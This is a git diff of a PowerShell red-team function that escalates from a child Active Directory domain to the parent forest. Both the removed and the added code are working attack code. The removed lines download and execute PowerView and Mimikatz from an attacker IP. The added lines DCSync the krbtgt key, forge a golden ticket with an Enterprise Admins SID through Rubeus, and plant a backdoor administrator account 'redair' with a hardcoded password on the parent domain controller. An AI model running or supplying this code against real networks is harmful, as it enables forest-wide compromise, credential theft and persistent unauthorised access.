@@ -1,42 +1,90 @@
 function raiseChild {
-    write-host "Preparing Child -> Parent Leap..." -ForegroundColor Green
 
-    # -
-    # change the below part to load Mimikatz and PowerView from your attack box
-    # -
-    IEX (iwr 'http://10.10.16.31/powerview-dev.ps1')
-    write-host "Loaded PowerView" -ForegroundColor Green
-    IEX (iwr 'http://10.10.16.31/invoke-mimz.ps1')
-    write-host "Loaded Mimikatz" -ForegroundColor Green
-    Write-Host " "
+    # *** Invoke-Mimikatz, Invoke-Rubeus and PowerView must be loaded first ***
+
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory = $true)]
+        [ValidateSet('WinRM', 'ADSI')]
+        [string]$Method
+    )
+
+    Write-Host "Preparing Child -> Parent escalation..." -ForegroundColor Green
+
     $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
     $parentDomain = $domain.Parent.Name
     $subdomain = ($domain.Name -split '\.')[0]
     $dsid = Get-DomainSID -Domain $domain
     $psid = Get-DomainSID -Domain $parentDomain
+
     Write-Host "Current Domain: $domain - SID: $dsid" -ForegroundColor Yellow
-    Write-Host "Parent Domain: $parentDomain - SID: $psid" -ForegroundColor Yellow
-    Write-Host "Getting KRBTGT's hash..." -ForegroundColor Yellow
-    $command = "'" + '"lsadump::dcsync /user:' + $subdomain + '\krbtgt"' + "'"
-    $final = "Invoke-mimz -Command $command"
-    $out = iex $final
+    Write-Host "DCSyncing KRBTGT..." -ForegroundColor Yellow
 
-    $ntlmLine = $out -split "`n" | Where-Object { $_ -match 'Hash NTLM:' }
+    # ---------- DCSync ----------
+    $dcsyncCmd = '"lsadump::dcsync /user:' + $subdomain + '\krbtgt"'
+    $out = Invoke-mimz -Command $dcsyncCmd
 
-    $ntlmHash = ($ntlmLine -split ': ')[1].Trim()
+    $aes256Line = $out -split "`n" | Where-Object { $_ -match 'aes256_hmac' }
+    $aes256Key = ($aes256Line -split ':\s+')[1].Trim()
+    Write-Host "KRBTGT's AES256 Key: $aes256Key" -ForegroundColor Red
 
-    Write-Host "KRBTGT's Hash: $ntlmHash " -ForegroundColor Red
+    # ---------- Golden ticket ----------
     $easid = $psid + "-519"
-    Write-Output " "
-    $gold = "'" + '"kerberos::golden /user:Administrator /domain:' + $domain + ' /sid:' + $dsid + ' /sids:' + $easid + ' /krbtgt:' + $ntlmHash + ' /startoffset:0 /endin:600 /renewmax:10080 /ptt"' + "'"
 
-    $golden = "Invoke-mimz -Command $gold"
-    Write-host "Executing..." -ForegroundColor Green
-    $execution = iex $golden
-    Write-host "Elevated to Enterprise Administrator!" -ForegroundColor Green
-    $parentDC = Get-DomainController -Domain $parentDomain
-    $parentDC = $parentDC.Name
-    Write-host "Popping a shell on $parentDC ..." -ForegroundColor Green
-    Write-host " "
-    Enter-PSSession -ComputerName $parentDC
+    $goldCmd = "golden /aes256:$aes256Key /user:Administrator /domain:$domain /sid:$dsid /sids:$easid /nowrap /ptt"
+    Invoke-Rubeus -Command $goldCmd | Out-Null
+    Write-Host "Elevating to Enterprise Administrator" -ForegroundColor Green
+
+    $parentDC = (Get-DomainController -Domain $parentDomain).Name
+
+    switch ($Method) {
+        'WinRM' {
+            Write-Host "Creating user 'redair' on $parentDC via WinRM..." -ForegroundColor Green
+            Invoke-Command -ComputerName $parentDC -ScriptBlock {
+                param($parentDomain)
+                Import-Module ActiveDirectory -ErrorAction SilentlyContinue
+                New-ADUser -Name "redair" -SamAccountName "redair" -UserPrincipalName "redair@$parentDomain" -AccountPassword (ConvertTo-SecureString "Passw0rd!" -AsPlainText -Force) -Enabled $true
+                Add-ADGroupMember -Identity "Administrators" -Members "redair"
+            } -ArgumentList $parentDomain
+        }
+        'ADSI' {
+            Write-Host "Creating user 'redair' on $parentDomain via ADSI/LDAP..." -ForegroundColor Green
+
+            $parentDCInfo = Get-DomainController -Domain $parentDomain | Select-Object -First 1
+            $ldapHost = ($parentDCInfo.Name -replace '^\\\\', '') -replace '^\\', ''
+
+            $rootDSE = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$ldapHost/RootDSE")
+            $baseDN = $rootDSE.Properties["defaultNamingContext"].Value
+            $usersDN = "LDAP://$ldapHost/CN=Users,$baseDN"
+            $users = New-Object System.DirectoryServices.DirectoryEntry($usersDN)
+
+            $sam = "redair"
+            $upn = "redair@$parentDomain"
+            $pwdPlain = "Passw0rd!"
+
+            # 1. Create the user object (no password yet)
+            $newUser = $users.Children.Add("CN=$sam", "user")
+            $newUser.Properties["sAMAccountName"].Value = $sam
+            $newUser.Properties["userPrincipalName"].Value = $upn
+            $newUser.Properties["displayName"].Value = $sam
+            $newUser.Properties["userAccountControl"].Value = 544   # NORMAL_ACCOUNT | PASSWD_NOTREQD
+
+            $newUser.CommitChanges()
+            Write-Host "User object created." -ForegroundColor Green
+
+            # 2. Set the password (the part that was failing)
+            $newUser.Invoke("SetPassword", $pwdPlain)
+            $newUser.Properties["userAccountControl"].Value = 0x10200  # NORMAL + DONT_EXPIRE
+            $newUser.CommitChanges()
+            Write-Host "Password set and account enabled." -ForegroundColor Green
+
+            # 3. Add to Administrators
+            $adminGroupDN = "LDAP://$ldapHost/CN=Administrators,CN=Builtin,$baseDN"
+            $adminGroup = New-Object System.DirectoryServices.DirectoryEntry($adminGroupDN)
+            $adminGroup.Properties["member"].Add($newUser.Properties["distinguishedName"].Value)
+            $adminGroup.CommitChanges()
+            Write-Host "User 'redair' added to Administrators." -ForegroundColor Green
+        }
+    }
+    Write-Host "User 'redair' (Passw0rd!) should exist on $parentDomain with full admin rights" -ForegroundColor Green
 }
